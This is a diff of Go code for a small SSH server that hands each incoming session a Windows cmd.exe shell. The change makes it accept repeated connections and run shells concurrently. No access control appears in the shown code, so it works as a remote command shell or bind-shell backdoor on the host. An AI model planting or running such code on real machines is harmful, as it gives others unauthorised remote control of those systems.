@@ -39,48 +39,51 @@ Uv/Vmfjc4SDQ6OPt0BNWTIP3t70Y64yK4ouUAigruA==
 	if error != nil {
 		log.Fatal("Failed to listen for connection: ", error)
 	}
-
-	newConn, error := listener.Accept()
-	if error != nil {
-		log.Fatal("Failed to accept new connection: ", error)
-	}
-
-	// When new connection arrives, perform SSH handshake
-	_, channels, requests, error := ssh.NewServerConn(newConn, config)
-	if error != nil {
-		log.Fatal("Failed to handshake: ", error)
-	}
-
-	log.Printf("Handshake successful")
-
-	// Handle incoming connection concurrently
-	go ssh.DiscardRequests(requests)
-
-	for newChannel := range channels {
-		// There are different types of channels, we only want to deal with
-		// sessions.
-		if newChannel.ChannelType() != "session" {
-			newChannel.Reject(ssh.UnknownChannelType, "Unknown channel type")
-		}
-
-		channel, requests, error := newChannel.Accept()
+	for {
+		newConn, error := listener.Accept()
 		if error != nil {
-			log.Fatal("Could not accept channel:", error)
+			log.Fatal("Failed to accept new connection: ", error)
 		}
 
-		// There are several types of out-of-band requests, we only want to
-		// deal with shells. Anonymous concurrent function.
-		go func(in <-chan *ssh.Request) {
-			for req := range in {
-				req.Reply(req.Type == "shell", nil)
+		// When new connection arrives, perform SSH handshake
+		_, channels, requests, error := ssh.NewServerConn(newConn, config)
+		if error != nil {
+			log.Fatal("Failed to handshake: ", error)
+		}
+
+		log.Printf("Handshake successful")
+
+		// Handle incoming connection concurrently
+		go ssh.DiscardRequests(requests)
+
+		for newChannel := range channels {
+			// There are different types of channels, we only want to deal with
+			// sessions.
+			if newChannel.ChannelType() != "session" {
+				newChannel.Reject(ssh.UnknownChannelType, "Unknown channel type")
 			}
-		}(requests)
 
-		shell := exec.Command("C:\\Windows\\System32\\cmd.exe")
-		shell.Stdin = channel
-		shell.Stdout = channel
-		shell.Stderr = channel
-		shell.Run()
+			channel, requests, error := newChannel.Accept()
+			if error != nil {
+				log.Fatal("Could not accept channel:", error)
+			}
 
+			// There are several types of out-of-band requests, we only want to
+			// deal with shells. Anonymous concurrent function.
+			go func(in <-chan *ssh.Request) {
+				for req := range in {
+					req.Reply(req.Type == "shell", nil)
+				}
+			}(requests)
+
+			shell := exec.Command("C:\\Windows\\System32\\cmd.exe")
+			shell.Stdin = channel
+			shell.Stdout = channel
+			shell.Stderr = channel
+			go func() {
+				defer channel.Close()
+				shell.Run()
+			}()
+		}
 	}
 }
